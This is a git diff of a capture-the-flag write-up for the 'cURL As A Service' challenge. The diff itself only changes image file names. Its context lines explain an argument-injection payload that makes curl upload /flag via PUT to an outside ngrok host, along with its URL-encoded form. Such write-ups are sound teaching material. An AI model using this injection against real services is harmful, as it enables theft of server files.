@@ -12,7 +12,7 @@ cURL As A Service or CAAS is a brand new Alien application, built so that humans
 
 ## Website
 
-<figure><img src="../../../.gitbook/assets/image (8).png" alt=""><figcaption><p>curl</p></figcaption></figure>
+<figure><img src="../../../.gitbook/assets/image (8) (1).png" alt=""><figcaption><p>curl</p></figcaption></figure>
 
 * A simple curl request that will get the frontend src code
 * There are many ways to solve this challenge
@@ -59,7 +59,7 @@ if __name__ == '__main__':
   * **-F "file=@/flag"** : This will tell curl what file to upload (-F is basically to mention we are using file)
 * Turn on burspsuite and url encode the above payload
 
-<figure><img src="../../../.gitbook/assets/image (9).png" alt=""><figcaption></figcaption></figure>
+<figure><img src="../../../.gitbook/assets/image (9) (1).png" alt=""><figcaption></figcaption></figure>
 
 ```bash
 -X+PUT+-F+"file%3d%40/flag"++https%3a//f9e2-122-177-22-17.ngrok-free.app/upload
